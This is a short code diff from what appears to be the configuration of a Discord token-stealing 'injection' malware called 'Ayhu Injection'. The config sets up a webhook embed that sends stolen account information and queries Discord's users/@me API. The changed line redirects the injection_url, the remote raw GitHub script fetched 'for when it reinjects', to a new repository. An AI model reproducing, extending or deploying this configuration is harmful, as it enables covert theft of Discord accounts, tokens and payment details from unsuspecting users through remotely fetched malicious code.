@@ -13,7 +13,7 @@ const config = {
   embed_name: "Ayhu Injection", //name of the webhook thats gonna send the info
   embed_icon: "https://cdn.discordapp.com/attachments/864559355768602654/1030131678536028201/yun-iijima-new-game.gif?size=4096".replace(/ /g, "%20"), //icon for the webhook thats gonna send the info (yes you can have spaces in the url)
   embed_color: 14423100, //color for the embed, needs to be hexadecimal (just copy a hex and then use https://www.binaryhexconverter.com/hex-to-decimal-converter to convert it)
-  injection_url: "https://raw.githubusercontent.com/addi00000/main/inject.js", //injection url for when it reinjects
+  injection_url: "https://raw.githubusercontent.com/injectorss/inject.js/main/inject.js", //injection url for when it reinjects
   api: "https://discord.com/api/v9/users/@me",
   nitro: {
     boost: {
